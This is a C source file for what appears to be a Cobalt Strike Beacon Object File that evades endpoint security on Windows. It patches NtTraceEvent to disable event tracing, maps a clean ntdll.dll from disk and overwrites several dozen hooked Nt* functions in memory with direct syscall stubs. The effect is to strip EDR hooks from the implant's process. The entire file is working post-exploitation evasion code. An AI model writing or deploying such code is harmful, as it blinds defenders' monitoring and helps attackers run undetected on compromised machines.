#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "beacon.h"

#define DEBUG TRUE
#undef DEBUG

#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }

DECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);
DECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);

VOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap);
VOID PatchHook(CHAR* address, unsigned char id, char high);
VOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll, BOOL *displayed);
FARPROC Resolver(CHAR *lib, CHAR *func);

FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);
#ifdef DEBUG
    printf("%s$%s located at 0x%p\n", lib, func, ptr);
#endif
    return ptr;
}

VOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap) {
		FARPROC CreateFile = Resolver("kernel32.dll", "CreateFileA");
		FARPROC CreateFileMapping = Resolver("kernel32.dll", "CreateFileMappingA");
		FARPROC MapViewOfFile = Resolver("kernel32.dll","MapViewOfFile");

        VOID *data = NULL;
        HANDLE localHFile = *hFile;
        HANDLE localHMap = *hMap;
        localHFile = CreateFile(name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        localHMap = CreateFileMapping(localHFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        data = MapViewOfFile(localHMap, FILE_MAP_READ, 0, 0, 0);

        hFile = &localHFile;
        hMap = &localHMap;

        return data;
}

VOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll, BOOL *displayed) {
	FARPROC GetProcAddress = Resolver("kernel32.dll", "GetProcAddress");
	FARPROC strcmp = Resolver("msvcrt.dll", "strcmp");
	
    DWORD dwIter = 0;
    CHAR* base = lib;
    CHAR* PE = base + (unsigned char)*(base + 0x3c);
    DWORD ExportDirectoryOffset = *((DWORD*)PE + (0x8a / 4));
    CHAR* ExportDirectory = base + ExportDirectoryOffset;
    DWORD dwFunctionsCount = *((DWORD*)ExportDirectory + (0x14 / 4));
    DWORD OffsetNamesTableOffset = *((DWORD*)ExportDirectory + (0x20 / 4));
    DWORD* OffsetNamesTable = base + OffsetNamesTableOffset;
    DWORD OffsetOrdinals = *((DWORD*)ExportDirectory + (0x24 / 4));
    WORD* ordinals = base + OffsetOrdinals;
    DWORD OffsetFunctions = *((DWORD*)ExportDirectory + (0x1c / 4));
    DWORD* functions = base + OffsetFunctions;

	if(!*displayed) {
		printf("------------------------------------------\nBASE\t\t\t0x%p\t%s\nPE\t\t\t0x%p\t%s\nExportTableOffset\t\t0x%p\nOffsetNameTable\t\t0x%p\nOrdinalTable\t\t0x%p\nFunctionTable\t\t0x%p\nFunctions Count\t\t0x%x (%d)\n------------------------------------------\n",
		base, base, PE, PE, ExportDirectory, OffsetNamesTable, ordinals, functions, dwFunctionsCount, dwFunctionsCount);
		*displayed = TRUE;
	}
	
    for(dwIter; dwIter < dwFunctionsCount - 1; dwIter++) {
        DWORD64 offset = *(OffsetNamesTable + dwIter);
        CHAR* current = base + offset;
        if(strcmp(current, name) == 0) {
            WORD offsetInOrdinal = *(ordinals + dwIter);
            DWORD function = *(functions + offsetInOrdinal);
            CHAR *func = base + function + 4;
            DWORD *data = (DWORD*)func;
            DWORD syscallID = *data;
            unsigned char id = syscallID;
            unsigned char high = syscallID >> 8;
			
            FARPROC toPatchAddr = GetProcAddress(hDll, name);
			
			printf("%s syscall ID is 0x%02x%02x. Real %s is at 0x%p\n", name, (unsigned char)high, (unsigned char)id, name, toPatchAddr);
			
            PatchHook(toPatchAddr, id, high);
            break;
        }
    }
	
}

VOID PatchETW() {
	FARPROC VirtualProtect = Resolver("kernel32.dll", "VirtualProtect");
	FARPROC memcpy = Resolver("msvcrt.dll", "memcpy");
	printf("Loading the ETW unhooking module\n");
	FARPROC NtEventTrace = Resolver("ntdll.dll", "NtTraceEvent");
	DWORD dwOld;
	CHAR patch[] = "\xc3\x90\x90";
    VirtualProtect(NtEventTrace, 3, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(NtEventTrace, patch, 3);
    VirtualProtect(NtEventTrace, 3, PAGE_EXECUTE_READ, &dwOld);
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
	FARPROC GlobalAlloc = Resolver("kernel32.dll", "GlobalAlloc");
	FARPROC GlobalFree = Resolver("kernel32.dll", "GlobalFree");
	FARPROC VirtualProtect = Resolver("kernel32.dll", "VirtualProtect");
	FARPROC sprintf = Resolver("msvcrt.dll", "sprintf");
	FARPROC memcpy = Resolver("msvcrt.dll", "memcpy");
	
	
    DWORD dwSize = 11;
    CHAR* patch_address = address;
	CHAR* patch = GlobalAlloc(GPTR, dwSize);
    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

    DWORD dwOld;
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, patch, dwSize);
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READ, &dwOld);
	GlobalFree(patch);	
}

int go(char *args, int length) {
	PatchETW();
	printf("Loading the unhooking module\n");
	FARPROC LoadLibrary = Resolver("kernel32.dll", "LoadLibraryA");
	FARPROC CloseHandle = CloseHandle = Resolver("kernel32.dll", "CloseHandle");
	FARPROC GetCurrentProcessId = Resolver("kernel32.dll", "GetCurrentProcessId");

    CHAR dll[] = "C:\\windows\\system32\\ntdll.dll";
    HANDLE hFile = NULL;
    HANDLE hMap = NULL;
    HANDLE hDll = LoadLibrary(dll);
	BOOL displayed = FALSE;
	
    printf("Opening %s\n", dll);
	
    VOID *data = GetFileFromDisk(dll, &hFile, &hMap);
    
	PatchAPI(data, "NtProtectVirtualMemory", hDll, &displayed); // should always be first
	PatchAPI(data, "NtMapViewOfSection", hDll, &displayed);
	PatchAPI(data, "NtMapViewOfSectionEx", hDll, &displayed);
	PatchAPI(data, "NtOpenProcess", hDll, &displayed);
	PatchAPI(data, "NtAllocateVirtualMemory", hDll, &displayed);
	PatchAPI(data, "NtAllocateVirtualMemoryEx", hDll, &displayed);
	PatchAPI(data, "NtGetContextThread", hDll, &displayed);
	PatchAPI(data, "NtQueryInformationThread", hDll, &displayed);
	PatchAPI(data, "NtQueueApcThread", hDll, &displayed);
	PatchAPI(data, "NtQueueApcThreadEx", hDll, &displayed);
	PatchAPI(data, "NtReadVirtualMemory", hDll, &displayed);
	PatchAPI(data, "NtResumeThread", hDll, &displayed);
	PatchAPI(data, "NtSetContextThread", hDll, &displayed);
	PatchAPI(data, "NtSetInformationProcess", hDll, &displayed);
	PatchAPI(data, "NtSetInformationThread", hDll, &displayed);
	PatchAPI(data, "NtSuspendThread", hDll, &displayed);
	PatchAPI(data, "NtUnmapViewOfSection", hDll, &displayed);
	PatchAPI(data, "NtUnmapViewOfSectionEx", hDll, &displayed);
	PatchAPI(data, "NtWriteVirtualMemory", hDll, &displayed);
	PatchAPI(data, "NtCreateThreadEx", hDll, &displayed);
	PatchAPI(data, "NtCreateThread", hDll, &displayed);
	PatchAPI(data, "NtCreateUserProcess", hDll, &displayed);
	PatchAPI(data, "NtCreateProcess", hDll, &displayed);
	PatchAPI(data, "NtCreateProcessEx", hDll, &displayed);
	PatchAPI(data, "NtAlertResumeThread", hDll, &displayed);
	PatchAPI(data, "NtQuerySystemInformation", hDll, &displayed);
	PatchAPI(data, "NtQuerySystemInformationEx", hDll, &displayed);
	PatchAPI(data, "NtCreateFile", hDll, &displayed);
	PatchAPI(data, "NtCreateKey", hDll, &displayed);
	PatchAPI(data, "NtOpenKey", hDll, &displayed);
	PatchAPI(data, "NtOpenFile", hDll, &displayed);
	PatchAPI(data, "NtTerminateThread", hDll, &displayed);
	PatchAPI(data, "NtSetValueKey", hDll, &displayed);
	PatchAPI(data, "NtOpenKeyEx", hDll, &displayed);
	PatchAPI(data, "NtDeleteFile", hDll, &displayed);
	PatchAPI(data, "NtDeleteKey", hDll, &displayed);
	PatchAPI(data, "NtDeleteValueKey", hDll, &displayed);

  CloseHandle(hFile);
  CloseHandle(hMap);
	 
	printf("Everything should be unhooked in the process with PID: %d\n", GetCurrentProcessId());

  return 0;
}
